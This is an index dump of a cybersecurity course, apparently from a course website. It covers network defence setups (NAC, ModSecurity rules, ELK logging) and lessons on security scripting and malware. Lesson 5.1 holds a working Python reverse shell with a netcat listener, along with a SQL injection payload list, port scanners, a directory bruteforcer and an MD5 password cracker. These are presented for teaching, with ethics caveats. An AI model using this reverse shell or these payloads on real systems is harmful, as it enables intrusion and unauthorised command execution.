/var/log/suricata/fast.log","title":"Suricata (Modern Alternative)"},{"location":"LECTURES/unit4/lesson4-2/#network-access-control-nac","text":"","title":"Network Access Control (NAC)"},{"location":"LECTURES/unit4/lesson4-2/#packetfence-setup","text":"Open-source NAC solution:","title":"PacketFence Setup"},{"location":"LECTURES/unit4/lesson4-2/#installation_2","text":"# Add repository echo \"deb http://inverse.ca/downloads/PacketFence/debian/ buster buster\" | sudo tee /etc/apt/sources.list.d/packetfence.list wget -O - https://inverse.ca/downloads/GPG_PUBLIC_KEY | sudo apt-key add - # Install sudo apt update sudo apt install packetfence","title":"Installation"},{"location":"LECTURES/unit4/lesson4-2/#configuration_1","text":"Web interface: http://server-ip:1443 Configure: 1. Network interfaces (management, registration, isolation) 2. Switch configuration 3. Authentication sources (AD, RADIUS, LDAP) 4. Violation policies 5. Provisioners (MDM integration)","title":"Configuration"},{"location":"LECTURES/unit4/lesson4-2/#8021x-configuration","text":"On switch (Cisco example): aaa new-model aaa authentication dot1x default group radius aaa authorization network default group radius dot1x system-auth-control interface GigabitEthernet1/0/1 switchport mode access authentication port-control auto dot1x pae authenticator RADIUS server (FreeRADIUS): # Install sudo apt install freeradius # Configure client (switch) sudo nano /etc/freeradius/3.0/clients.conf client switch1 { ipaddr = 192.168.1.10 secret = shared-secret shortname = switch1 }","title":"802.1X Configuration"},{"location":"LECTURES/unit4/lesson4-2/#web-application-firewall-waf","text":"","title":"Web Application Firewall (WAF)"},{"location":"LECTURES/unit4/lesson4-2/#modsecurity-with-apache","text":"","title":"ModSecurity with Apache"},{"location":"LECTURES/unit4/lesson4-2/#installation_3","text":"sudo apt install libapache2-mod-security2 # Enable sudo a2enmod security2 sudo systemctl restart apache2","title":"Installation"},{"location":"LECTURES/unit4/lesson4-2/#configuration_2","text":"# Copy recommended config sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf # Edit config sudo nano /etc/modsecurity/modsecurity.conf # Enable ModSecurity SecRuleEngine On # Set detection only (for testing) # SecRuleEngine DetectionOnly # Audit logging SecAuditEngine RelevantOnly SecAuditLog /var/log/apache2/modsec_audit.log","title":"Configuration"},{"location":"LECTURES/unit4/lesson4-2/#owasp-core-rule-set","text":"# Install CRS cd /etc/modsecurity sudo git clone https://github.com/coreruleset/coreruleset.git cd coreruleset sudo mv crs-setup.conf.example crs-setup.conf # Include in Apache sudo nano /etc/apache2/mods-enabled/security2.conf IncludeOptional /etc/modsecurity/*.conf IncludeOptional /etc/modsecurity/coreruleset/crs-setup.conf IncludeOptional /etc/modsecurity/coreruleset/rules/*.conf sudo systemctl restart apache2","title":"OWASP Core Rule Set"},{"location":"LECTURES/unit4/lesson4-2/#custom-rules","text":"sudo nano /etc/modsecurity/modsecurity_custom.conf # Block SQL injection SecRule ARGS \"@detectSQLi\" \"id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'\" # Block XSS SecRule ARGS \"@detectXSS\" \"id:1002,phase:2,deny,status:403,msg:'XSS Attempt'\" # Block directory traversal SecRule ARGS \"@contains ../\" \"id:1003,phase:2,deny,status:403,msg:'Directory Traversal Attempt'\" # Rate limiting SecAction \"id:1004,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR}\" SecRule IP:REQUEST_COUNT \"@gt 100\" \"id:1005,phase:2,deny,status:429,msg:'Rate Limit Exceeded',setvar:ip.request_count=+1\"","title":"Custom Rules"},{"location":"LECTURES/unit4/lesson4-2/#security-monitoring","text":"","title":"Security Monitoring"},{"location":"LECTURES/unit4/lesson4-2/#centralized-logging-with-elk-stack","text":"","title":"Centralized Logging with ELK Stack"},{"location":"LECTURES/unit4/lesson4-2/#elasticsearch-installation","text":"# Add repository wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - echo \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list # Install sudo apt update sudo apt install elasticsearch # Configure sudo nano /etc/elasticsearch/elasticsearch.yml network.host: localhost http.port: 9200 # Start sudo systemctl start elasticsearch sudo systemctl enable elasticsearch","title":"Elasticsearch Installation"},{"location":"LECTURES/unit4/lesson4-2/#logstash-installation","text":"sudo apt install logstash # Create configuration sudo nano /etc/logstash/conf.d/syslog.conf input { syslog { port => 5514 } } filter { if [program] == \"sshd\" { grok { match => { \"message\" => \"%{DATA:auth_method} %{DATA:auth_result} for %{DATA:user} from %{IP:src_ip}\" } } } } output { elasticsearch { hosts => [\"localhost:9200\"] index => \"syslog-%{+YYYY.MM.dd}\" } } # Start sudo systemctl start logstash sudo systemctl enable logstash","title":"Logstash Installation"},{"location":"LECTURES/unit4/lesson4-2/#kibana-installation","text":"sudo apt install kibana # Configure sudo nano /etc/kibana/kibana.yml server.host: \"localhost\" elasticsearch.hosts: [\"http://localhost:9200\"] # Start sudo systemctl start kibana sudo systemctl enable kibana Access Kibana: http://localhost:5601","title":"Kibana Installation"},{"location":"LECTURES/unit4/lesson4-2/#siem-rules","text":"Failed login detection: # In Kibana, create alert: Index: syslog-* Query: program:\"sshd\" AND message:\"Failed password\" Threshold: > 5 in 5 minutes Action: Email alert","title":"SIEM Rules"},{"location":"LECTURES/unit4/lesson4-2/#key-takeaways","text":"Hands-on skills covered: - Firewall configuration (iptables, UFW) - VPN setup (OpenVPN, WireGuard) - IDS implementation (Snort, Suricata) - NAC deployment (802.1X) - WAF configuration (ModSecurity) - Centralized logging (ELK Stack) Best practices: - Test in lab before production - Document all configurations - Monitor logs for alerts - Regular rule updates - Performance testing - Backup configurations Remember: - Security controls must be maintained - Rules need constant tuning - False positives are normal (at first) - Defense in depth\u2014use multiple controls These are real-world skills. Practice them in virtual machines, build a home lab, and experiment. Reading about security is good; doing security is better.","title":"Key Takeaways"},{"location":"LECTURES/unit5/lesson5-1/","text":"Basic Scripting & Malware Now we're getting to the offensive side of cybersecurity. To understand how to defend against attacks, you need to understand how attacks work. And many attacks\u2014especially sophisticated ones\u2014rely on scripting and programming. Why Scripting Matters in Cybersecurity Manual hacking is slow and inefficient. Professional security researchers and attackers alike use scripts to automate repetitive tasks, process large amounts of data, and perform complex operations quickly. Scripting is essential for: - Reconnaissance : Scanning networks and gathering information - Exploitation : Automating exploit delivery - Post-exploitation : Maintaining access and exfiltrating data - Malware development : Creating viruses, worms, and trojans - Defense : Analyzing logs, monitoring systems, automating responses - Penetration testing : Simulating attacks to find vulnerabilities If you want to be effective in cybersecurity\u2014on either the offensive or defensive side\u2014you need to learn to script. Bash Scripting: The System Administrator's Tool Bash (Bourne Again Shell) is the default shell on most Linux systems. A Bash script is a text file containing a series of commands that execute sequentially. Your First Bash Script Let's create a simple network reconnaissance script: #!/bin/bash # This is a comment - the line above tells the system this is a bash script echo \"Starting network scan...\" # Get your local IP address MY_IP=$(hostname -I | awk '{print $1}') echo \"Your IP address: $MY_IP\" # Ping sweep to find active hosts echo \"Scanning for active hosts...\" for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo \"Host 192.168.1.$i is up\" done echo \"Scan complete!\" What this does: - #!/bin/bash - shebang, tells system how to execute this file - echo - prints text to terminal - $(command) - command substitution, captures command output - for loop - repeats actions - ping -c 1 - sends one ping packet - &>/dev/null - discards output (silent operation) - && - only execute next command if previous succeeded Bash Scripting Fundamentals Variables: NAME=\"scanner\" COUNT=10 echo \"Running $NAME $COUNT times\" Conditionals: if [ \"$COUNT\" -gt 5 ]; then echo \"Count is greater than 5\" elif [ \"$COUNT\" -eq 5 ]; then echo \"Count equals 5\" else echo \"Count is less than 5\" fi Loops: # For loop for i in {1..10}; do echo \"Number $i\" done # While loop COUNTER=0 while [ $COUNTER -lt 10 ]; do echo \"Counter: $COUNTER\" COUNTER=$((COUNTER + 1)) done Reading Files: while IFS= read -r line; do echo \"Processing: $line\" done < targets.txt Functions: scan_port() { local host=$1 local port=$2 timeout 1 bash -c \"echo >/dev/tcp/$host/$port\" 2>/dev/null && \\ echo \"Port $port is open on $host\" } scan_port 192.168.1.1 80 scan_port 192.168.1.1 443 Practical Security Scripts Port Scanner: #!/bin/bash TARGET=$1 for PORT in {1..1024}; do timeout 1 bash -c \"echo >/dev/tcp/$TARGET/$PORT\" 2>/dev/null && \\ echo \"Port $PORT is open\" done Log Monitor: #!/bin/bash LOG_FILE=\"/var/log/auth.log\" ALERT_EMAIL=\"admin@company.com\" # Watch for failed login attempts tail -F $LOG_FILE | while read line; do if echo \"$line\" | grep -q \"Failed password\"; then echo \"ALERT: Failed login attempt detected: $line\" | \\ mail -s \"Security Alert\" $ALERT_EMAIL fi done Python: The Security Researcher's Language Python is the most popular language in cybersecurity. It's powerful, readable, and has thousands of libraries for security tasks. Why Python? Easy to learn : Clear, readable syntax Powerful libraries : Scapy for packets, Requests for web, Paramiko for SSH Cross-platform : Works on Linux, Windows, macOS Industry standard : Most security tools written in or support Python Rapid development : Write exploits and tools quickly Python Basics for Security Simple Port Scanner: import socket def scan_port(host, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(1) result = sock.connect_ex((host, port)) sock.close() return result == 0 # 0 means port is open target = \"192.168.1.1\" for port in range(1, 1025): if scan_port(target, port): print(f\"Port {port} is open\") HTTP Request Script: import requests url = \"http://example.com/login\" data = {\"username\": \"admin\", \"password\": \"test\"} response = requests.post(url, data=data) print(f\"Status Code: {response.status_code}\") print(f\"Response: {response.text}\") Password Generator: import random import string def generate_password(length=12): characters = string.ascii_letters + string.digits + string.punctuation password = ''.join(random.choice(characters) for _ in range(length)) return password # Generate 10 passwords for _ in range(10): print(generate_password(16)) Basic Network Sniffer (using Scapy): from scapy.all import sniff, IP, TCP def packet_callback(packet): if packet.haslayer(IP): src_ip = packet[IP].src dst_ip = packet[IP].dst if packet.haslayer(TCP): src_port = packet[TCP].sport dst_port = packet[TCP].dport print(f\"{src_ip}:{src_port} -> {dst_ip}:{dst_port}\") # Sniff 100 packets sniff(prn=packet_callback, count=100) Python for Web Exploitation SQL Injection Tester: import requests def test_sql_injection(url, param): payloads = [ \"' OR '1'='1\", \"' OR '1'='1' --\", \"' OR 1=1--\", \"admin'--\", \"' UNION SELECT NULL--\" ] for payload in payloads: params = {param: payload} response = requests.get(url, params=params) if \"error\" in response.text.lower() or \\ \"syntax\" in response.text.lower(): print(f\"Possible SQL injection with payload: {payload}\") test_sql_injection(\"http://vulnerable-site.com/search\", \"q\") Directory Bruteforcer: import requests def bruteforce_directories(base_url, wordlist_file): with open(wordlist_file, 'r') as f: for line in f: directory = line.strip() url = f\"{base_url}/{directory}\" response = requests.get(url) if response.status_code == 200: print(f\"Found: {url}\") elif response.status_code == 403: print(f\"Forbidden: {url}\") bruteforce_directories(\"http://target.com\", \"directories.txt\") Understanding Malware Now let's talk about the dark side: malware (malicious software). Understanding how malware works is crucial for defending against it. Types of Malware Viruses: - Attach themselves to legitimate programs - Spread when infected program is executed - Require user action to spread - Can modify or delete files, corrupt systems Worms: - Self-replicating, spread automatically - Don't need to attach to programs - Spread through network vulnerabilities - Can consume bandwidth and system resources - Examples: Morris Worm (1988), WannaCry (2017) Trojans: - Disguised as legitimate software - Don't self-replicate - Give attackers remote access - Often used to install other malware - Example: Banking trojans that steal credentials Ransomware: - Encrypts victim's files - Demands payment for decryption key - Often spread through phishing or vulnerabilities - Major threat to businesses and individuals - Examples: WannaCry, Ryuk, REvil Spyware: - Monitors user activity - Steals information (passwords, credit cards, browsing) - Often installed through deceptive downloads - Keyloggers are a type of spyware Rootkits: - Hide presence of other malware - Operate at kernel level - Very difficult to detect and remove - Give attackers privileged access Botnets: - Networks of infected computers (bots/zombies) - Controlled by attacker (botmaster) - Used for DDoS attacks, spam, crypto mining - Victims often don't know they're infected Malware Behavior Persistence Mechanisms: Malware needs to survive reboots and remain active. Common techniques: - Registry modifications (Windows) - Startup scripts (Linux/Windows) - Scheduled tasks - Service installation - Browser extensions - Bootkit (infects boot process) Command and Control (C2): Malware often communicates with attacker-controlled servers: - Receive commands - Exfiltrate stolen data - Download updates - Report infection status C2 channels can use: - HTTP/HTTPS (blend with normal traffic) - DNS (queries can encode data) - Social media APIs - Peer-to-peer networks - Custom protocols Evasion Techniques: Malware tries to avoid detection: - Obfuscation : Makes code hard to analyze - Encryption : Encrypts itself, decrypts at runtime - Polymorphism : Changes its code each time it spreads - Metamorphism : Completely rewrites its code - Anti-VM : Detects virtual machines used for analysis - Time delays : Waits before activating to avoid sandboxes - Domain generation algorithms (DGA) : Creates many C2 domains Simple Malware Example (Educational Purpose) IMPORTANT : This is for educational purposes only. Creating or deploying malware maliciously is illegal and unethical. # Simple reverse shell (attacker gains remote access) import socket import subprocess def reverse_shell(attacker_ip, attacker_port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((attacker_ip, attacker_port)) while True: # Receive command from attacker command = sock.recv(1024).decode() if command.lower() == 'exit': break # Execute command output = subprocess.run(command, shell=True, capture_output=True, text=True) # Send output back to attacker result = output.stdout + output.stderr sock.send(result.encode()) sock.close() # This would connect to attacker's machine # reverse_shell(\"attacker_ip\", 4444) On the attacker side: # Listen for connection nc -lvp 4444 This demonstrates how malware can give remote access, but real malware is much more sophisticated\u2014with encryption, obfuscation, persistence, and anti-detection. Analyzing Malware Safely Never run unknown malware on your actual system. Use: Virtual Machines: - Isolated environment - Can snapshot and revert - Tools: VirtualBox, VMware, QEMU Sandboxes: - Automated malware analysis - Monitor behavior safely - Tools: Cuckoo Sandbox, Joe Sandbox, Any.run Static Analysis: - Examine code without executing - Tools: IDA Pro, Ghidra, radare2 - Look for strings, imported functions, suspicious code Dynamic Analysis: - Execute in controlled environment - Monitor: file operations, network connections, registry changes - Tools: Process Monitor, Wireshark, API monitors Creating Security Tools Let's build some useful tools: Password Cracker (Dictionary Attack): import hashlib def crack_md5_hash(target_hash, wordlist_file): with open(wordlist_file, 'r', encoding='latin-1') as f: for line in f: password = line.strip() hash_attempt = hashlib.md5(password.encode()).hexdigest() if hash_attempt == target_hash: print(f\"Password found: {password}\") return password print(\"Password not found in wordlist\") return None # Example usage target = \"5f4dcc3b5aa765d61d8327deb882cf99\" # \"password\" in MD5 crack_md5_hash(target, \"rockyou.txt\") Network Connection Monitor: import psutil import time def monitor_connections(): known_connections = set() while True: connections = psutil.net_connections() for conn in connections: if conn.status == 'ESTABLISHED': conn_info = (conn.laddr.ip, conn.laddr.port, conn.raddr.ip if conn.raddr else None, conn.raddr.port if conn.raddr else None) if conn_info not in known_connections: print(f\"New connection: {conn_info}\") known_connections.add(conn_info) time.sleep(5) monitor_connections() Best Practices for Security Scripting Test in isolated environments : Don't run untested scripts on production systems Validate input : Always sanitize and validate user input Handle errors : Scripts should fail gracefully Log actions : Keep records of what your scripts do Comment code : Explain what your code does Use version control : Track changes with Git Follow responsible disclosure : Report vulnerabilities properly Ethical Considerations You now have knowledge that could be used maliciously. Remember: Never attack systems you don't own or have explicit permission to test Malware development for malicious purposes is illegal Responsible disclosure is the ethical path when finding vulnerabilities Consent is required for penetration testing Knowledge is not an excuse for illegal activity Many security professionals started by being curious and learning these skills. The difference between a security professional and a criminal is permission and intent. What's Next In upcoming lessons, we'll: - Dive deeper into network traffic analysis - Learn to use professional security tools - Study real-world attack scenarios - Develop more sophisticated scripts - Analyze actual malware samples Scripting is a skill that improves with practice. Start small, build simple tools, and gradually increase complexity. Every security professional relies on scripting daily\u2014it's what separates script kiddies from professionals.","title":"Lesson 5.1"},{"location":"LECTURES/unit5/lesson5-1/#basic-scripting-malware","text":"Now we're getting to the offensive side of cybersecurity. To understand how to defend against attacks, you need to understand how attacks work. And many attacks\u2014especially sophisticated ones\u2014rely on scripting and programming.","title":"Basic Scripting &amp; Malware"},{"location":"LECTURES/unit5/lesson5-1/#why-scripting-matters-in-cybersecurity","text":"Manual hacking is slow and inefficient. Professional security researchers and attackers alike use scripts to automate repetitive tasks, process large amounts of data, and perform complex operations quickly. Scripting is essential for: - Reconnaissance : Scanning networks and gathering information - Exploitation : Automating exploit delivery - Post-exploitation : Maintaining access and exfiltrating data - Malware development : Creating viruses, worms, and trojans - Defense : Analyzing logs, monitoring systems, automating responses - Penetration testing : Simulating attacks to find vulnerabilities If you want to be effective in cybersecurity\u2014on either the offensive or defensive side\u2014you need to learn to script.","title":"Why Scripting Matters in Cybersecurity"},{"location":"LECTURES/unit5/lesson5-1/#bash-scripting-the-system-administrators-tool","text":"Bash (Bourne Again Shell) is the default shell on most Linux systems. A Bash script is a text file containing a series of commands that execute sequentially.","title":"Bash Scripting: The System Administrator's Tool"},{"location":"LECTURES/unit5/lesson5-1/#your-first-bash-script","text":"Let's create a simple network reconnaissance script: #!/bin/bash # This is a comment - the line above tells the system this is a bash script echo \"Starting network scan...\" # Get your local IP address MY_IP=$(hostname -I | awk '{print $1}') echo \"Your IP address: $MY_IP\" # Ping sweep to find active hosts echo \"Scanning for active hosts...\" for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo \"Host 192.168.1.$i is up\" done echo \"Scan complete!\" What this does: - #!/bin/bash - shebang, tells system how to execute this file - echo - prints text to terminal - $(command) - command substitution, captures command output - for loop - repeats actions - ping -c 1 - sends one ping packet - &>/dev/null - discards output (silent operation) - && - only execute next command if previous succeeded","title":"Your First Bash Script"},{"location":"LECTURES/unit5/lesson5-1/#bash-scripting-fundamentals","text":"Variables: NAME=\"scanner\" COUNT=10 echo \"Running $NAME $COUNT times\" Conditionals: if [ \"$COUNT\" -gt 5 ]; then echo \"Count is greater than 5\" elif [ \"$COUNT\" -eq 5 ]; then echo \"Count equals 5\" else echo \"Count is less than 5\" fi Loops: # For loop for i in {1..10}; do echo \"Number $i\" done # While loop COUNTER=0 while [ $COUNTER -lt 10 ]; do echo \"Counter: $COUNTER\" COUNTER=$((COUNTER + 1)) done Reading Files: while IFS= read -r line; do echo \"Processing: $line\" done < targets.txt Functions: scan_port() { local host=$1 local port=$2 timeout 1 bash -c \"echo >/dev/tcp/$host/$port\" 2>/dev/null && \\ echo \"Port $port is open on $host\" } scan_port 192.168.1.1 80 scan_port 192.168.1.1 443","title":"Bash Scripting Fundamentals"},{"location":"LECTURES/unit5/lesson5-1/#practical-security-scripts","text":"Port Scanner: #!/bin/bash TARGET=$1 for PORT in {1..1024}; do timeout 1 bash -c \"echo >/dev/tcp/$TARGET/$PORT\" 2>/dev/null && \\ echo \"Port $PORT is open\" done Log Monitor: #!/bin/bash LOG_FILE=\"/var/log/auth.log\" ALERT_EMAIL=\"admin@company.com\" # Watch for failed login attempts tail -F $LOG_FILE | while read line; do if echo \"$line\" | grep -q \"Failed password\"; then echo \"ALERT: Failed login attempt detected: $line\" | \\ mail -s \"Security Alert\" $ALERT_EMAIL fi done","title":"Practical Security Scripts"},{"location":"LECTURES/unit5/lesson5-1/#python-the-security-researchers-language","text":"Python is the most popular language in cybersecurity. It's powerful, readable, and has thousands of libraries for security tasks.","title":"Python: The Security Researcher's Language"},{"location":"LECTURES/unit5/lesson5-1/#why-python","text":"Easy to learn : Clear, readable syntax Powerful libraries : Scapy for packets, Requests for web, Paramiko for SSH Cross-platform : Works on Linux, Windows, macOS Industry standard : Most security tools written in or support Python Rapid development : Write exploits and tools quickly","title":"Why Python?"},{"location":"LECTURES/unit5/lesson5-1/#python-basics-for-security","text":"Simple Port Scanner: import socket def scan_port(host, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(1) result = sock.connect_ex((host, port)) sock.close() return result == 0 # 0 means port is open target = \"192.168.1.1\" for port in range(1, 1025): if scan_port(target, port): print(f\"Port {port} is open\") HTTP Request Script: import requests url = \"http://example.com/login\" data = {\"username\": \"admin\", \"password\": \"test\"} response = requests.post(url, data=data) print(f\"Status Code: {response.status_code}\") print(f\"Response: {response.text}\") Password Generator: import random import string def generate_password(length=12): characters = string.ascii_letters + string.digits + string.punctuation password = ''.join(random.choice(characters) for _ in range(length)) return password # Generate 10 passwords for _ in range(10): print(generate_password(16)) Basic Network Sniffer (using Scapy): from scapy.all import sniff, IP, TCP def packet_callback(packet): if packet.haslayer(IP): src_ip = packet[IP].src dst_ip = packet[IP].dst if packet.haslayer(TCP): src_port = packet[TCP].sport dst_port = packet[TCP].dport print(f\"{src_ip}:{src_port} -> {dst_ip}:{dst_port}\") # Sniff 100 packets sniff(prn=packet_callback, count=100)","title":"Python Basics for Security"},{"location":"LECTURES/unit5/lesson5-1/#python-for-web-exploitation","text":"SQL Injection Tester: import requests def test_sql_injection(url, param): payloads = [ \"' OR '1'='1\", \"' OR '1'='1' --\", \"' OR 1=1--\", \"admin'--\", \"' UNION SELECT NULL--\" ] for payload in payloads: params = {param: payload} response = requests.get(url, params=params) if \"error\" in response.text.lower() or \\ \"syntax\" in response.text.lower(): print(f\"Possible SQL injection with payload: {payload}\") test_sql_injection(\"http://vulnerable-site.com/search\", \"q\") Directory Bruteforcer: import requests def bruteforce_directories(base_url, wordlist_file): with open(wordlist_file, 'r') as f: for line in f: directory = line.strip() url = f\"{base_url}/{directory}\" response = requests.get(url) if response.status_code == 200: print(f\"Found: {url}\") elif response.status_code == 403: print(f\"Forbidden: {url}\") bruteforce_directories(\"http://target.com\", \"directories.txt\")","title":"Python for Web Exploitation"},{"location":"LECTURES/unit5/lesson5-1/#understanding-malware","text":"Now let's talk about the dark side: malware (malicious software). Understanding how malware works is crucial for defending against it.","title":"Understanding Malware"},{"location":"LECTURES/unit5/lesson5-1/#types-of-malware","text":"Viruses: - Attach themselves to legitimate programs - Spread when infected program is executed - Require user action to spread - Can modify or delete files, corrupt systems Worms: - Self-replicating, spread automatically - Don't need to attach to programs - Spread through network vulnerabilities - Can consume bandwidth and system resources - Examples: Morris Worm (1988), WannaCry (2017) Trojans: - Disguised as legitimate software - Don't self-replicate - Give attackers remote access - Often used to install other malware - Example: Banking trojans that steal credentials Ransomware: - Encrypts victim's files - Demands payment for decryption key - Often spread through phishing or vulnerabilities - Major threat to businesses and individuals - Examples: WannaCry, Ryuk, REvil Spyware: - Monitors user activity - Steals information (passwords, credit cards, browsing) - Often installed through deceptive downloads - Keyloggers are a type of spyware Rootkits: - Hide presence of other malware - Operate at kernel level - Very difficult to detect and remove - Give attackers privileged access Botnets: - Networks of infected computers (bots/zombies) - Controlled by attacker (botmaster) - Used for DDoS attacks, spam, crypto mining - Victims often don't know they're infected","title":"Types of Malware"},{"location":"LECTURES/unit5/lesson5-1/#malware-behavior","text":"Persistence Mechanisms: Malware needs to survive reboots and remain active. Common techniques: - Registry modifications (Windows) - Startup scripts (Linux/Windows) - Scheduled tasks - Service installation - Browser extensions - Bootkit (infects boot process) Command and Control (C2): Malware often communicates with attacker-controlled servers: - Receive commands - Exfiltrate stolen data - Download updates - Report infection status C2 channels can use: - HTTP/HTTPS (blend with normal traffic) - DNS (queries can encode data) - Social media APIs - Peer-to-peer networks - Custom protocols Evasion Techniques: Malware tries to avoid detection: - Obfuscation : Makes code hard to analyze - Encryption : Encrypts itself, decrypts at runtime - Polymorphism : Changes its code each time it spreads - Metamorphism : Completely rewrites its code - Anti-VM : Detects virtual machines used for analysis - Time delays : Waits before activating to avoid sandboxes - Domain generation algorithms (DGA) : Creates many C2 domains","title":"Malware Behavior"},{"location":"LECTURES/unit5/lesson5-1/#simple-malware-example-educational-purpose","text":"IMPORTANT : This is for educational purposes only. Creating or deploying malware maliciously is illegal and unethical. # Simple reverse shell (attacker gains remote access) import socket import subprocess def reverse_shell(attacker_ip, attacker_port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((attacker_ip, attacker_port)) while True: # Receive command from attacker command = sock.recv(1024).decode() if command.lower() == 'exit': break # Execute command output = subprocess.run(command, shell=True, capture_output=True, text=True) # Send output back to attacker result = output.stdout + output.stderr sock.send(result.encode()) sock.close() # This would connect to attacker's machine # reverse_shell(\"attacker_ip\", 4444) On the attacker side: # Listen for connection nc -lvp 4444 This demonstrates how malware can give remote access, but real malware is much more sophisticated\u2014with encryption, obfuscation, persistence, and anti-detection.","title":"Simple Malware Example (Educational Purpose)"},{"location":"LECTURES/unit5/lesson5-1/#analyzing-malware-safely","text":"Never run unknown malware on your actual system. Use: Virtual Machines: - Isolated environment - Can snapshot and revert - Tools: VirtualBox, VMware, QEMU Sandboxes: - Automated malware analysis - Monitor behavior safely - Tools: Cuckoo Sandbox, Joe Sandbox, Any.run Static Analysis: - Examine code without executing - Tools: IDA Pro, Ghidra, radare2 - Look for strings, imported functions, suspicious code Dynamic Analysis: - Execute in controlled environment - Monitor: file operations, network connections, registry changes - Tools: Process Monitor, Wireshark, API monitors","title":"Analyzing Malware Safely"},{"location":"LECTURES/unit5/lesson5-1/#creating-security-tools","text":"Let's build some useful tools: Password Cracker (Dictionary Attack): import hashlib def crack_md5_hash(target_hash, wordlist_file): with open(wordlist_file, 'r', encoding='latin-1') as f: for line in f: password = line.strip() hash_attempt = hashlib.md5(password.encode()).hexdigest() if hash_attempt == target_hash: print(f\"Password found: {password}\") return password print(\"Password not found in wordlist\") return None # Example usage target = \"5f4dcc3b5aa765d61d8327deb882cf99\" # \"password\" in MD5 crack_md5_hash(target, \"rockyou.txt\") Network Connection Monitor: import psutil import time def monitor_connections(): known_connections = set() while True: connections = psutil.net_connections() for conn in connections: if conn.status == 'ESTABLISHED': conn_info = (conn.laddr.ip, conn.laddr.port, conn.raddr.ip if conn.raddr else None, conn.raddr.port if conn.raddr else None) if conn_info not in known_connections: print(f\"New connection: {conn_info}\") known_connections.add(conn_info) time.sleep(5) monitor_connections()","title":"Creating Security Tools"},{"location":"LECTURES/unit5/lesson5-1/#best-practices-for-security-scripting","text":"Test in isolated environments : Don't run untested scripts on production systems Validate input : Always sanitize and validate user input Handle errors : Scripts should fail gracefully Log actions : Keep records of what your scripts do Comment code : Explain what your code does Use version control : Track changes with Git Follow responsible disclosure : Report vulnerabilities properly","title":"Best Practices for Security Scripting"},{"location":"LECTURES/unit5/lesson5-1/#ethical-considerations","text":"You now have knowledge that could be used maliciously. Remember: Never attack systems you don't own or have explicit permission to test Malware development for malicious purposes is illegal Responsible disclosure is the ethical path when finding vulnerabilities Consent is required for penetration testing Knowledge is not an excuse for illegal activity Many security professionals started by being curious and learning these skills. The difference between a security professional and a criminal is permission and intent.","title":"Ethical Considerations"},{"location":"LECTURES/unit5/lesson5-1/#whats-next","text":"In upcoming lessons, we'll: - Dive deeper into network traffic analysis - Learn to use professional security tools - Study real-world attack scenarios - Develop more sophisticated scripts - Analyze actual malware samples Scripting is a skill that improves with practice. Start small, build simple tools, and gradually increase complexity. Every security professional relies on scripting daily\u2014it's what separates script kiddies from professionals.","title":"What's Next"},{"location":"LECTURES/unit5/lesson5-2/","text":"Advanced Scripting for Security You've learned basic scripting. Now let's level up with advanced techniques that security professionals use daily. These scripts automate reconnaissance, testing, analysis, and response\u2014saving hours of manual work. Python for Security - Advanced Techniques Working with APIs Most security tools and services provide APIs. Learn to interact with them. HTTP Requests with Authentication import requests # Basic authentication response = requests.get('https://api.example.com/data', auth=('username', 'password')) # Bearer token authentication headers = {'Authorization': 'Bearer YOUR_TOKEN_HERE'} response = requests.get('https://api.example.com/data', headers=headers) # API key in header headers = {'X-API-Key': 'your-api-key'} response = requests.get('https://api.example.com/data', headers=headers) print(response.json()) VirusTotal API Integration import requests import hashlib def check_file_virustotal(filepath, api_key): # Calculate file hash with open(filepath, 'rb') as f: file_hash = hashlib.sha256(f.read()).hexdigest() # Check hash on VirusTotal url = f'https://www.virustotal.com/api/v3/files/{file_hash}' headers = {'x-apikey': api_key} response = requests.get(url, headers=headers) if response.status_code == 200: data = response.json() stats = data['data']['attributes']['last_analysis_stats'] print(f\"Malicious detections: {stats['malicious']}\") print(f\"Total engines: {sum(stats.values())}\") return stats elif response.status_code == 404: print(\"File not found in VirusTotal database\") else: print(f\"Error: {response.status_code}\") return None # Usage check_file_virustotal('suspicious.exe', 'YOUR_API_KEY') Multithreading for Speed Speed up network scanning: import threading import socket from queue import Queue # Thread-safe queue queue = Queue() open_ports = [] def port_scan(target, port): try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(1) result = sock.connect_ex((target, port)) if result == 0: open_ports.append(port) print(f\"Port {port} is open\") sock.close() except: pass def worker(target): while not queue.empty(): port = queue.get() port_scan(target, port) queue.task_done() def threaded_port_scan(target, num_threads=100): # Fill queue with ports for port in range(1, 1025): queue.put(port) # Create threads threads = [] for _ in range(num_threads): thread = threading.Thread(target=worker, args=(target,)) thread.daemon = True thread.start() threads.append(thread) # Wait for completion queue.join() return sorted(open_ports) # Usage target = \"192.168.1.1\" print(f\"Scanning {target}...\") ports = threaded_port_scan(target) print(f\"Open ports: {ports}\") Subprocess Management Execute system commands safely: import subprocess import shlex def run_command(command): \"\"\"Safely execute shell command\"\"\" try: # Split command safely args = shlex.split(command) # Run command result = subprocess.run(args, capture_output=True, text=True, timeout=30) return { 'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode } except subprocess.TimeoutExpired: return {'error': 'Command timed out'} except Exception as e: return {'error': str(e)} # Usage result = run_command('nmap -sV 192.168.1.1') print(result['stdout']) Regular Expressions for Log Parsing import re from collections import Counter def parse_auth_log(logfile): \"\"\"Parse authentication log for failed logins\"\"\" failed_ips = [] # Pattern for failed SSH attempts pattern = r'Failed password for .+ from (\\d+\\.\\d+\\.\\d+\\.\\d+)' with open(logfile, 'r') as f: for line in f: match = re.search(pattern, line) if match: failed_ips.append(match.group(1)) # Count attempts per IP ip_counts = Counter(failed_ips) # IPs with more than 5 attempts suspicious = {ip: count for ip, count in ip_counts.items() if count > 5} return suspicious # Usage suspicious_ips = parse_auth_log('/var/log/auth.log') for ip, count in suspicious_ips.items(): print(f\"{ip}: {count} failed attempts\") Working 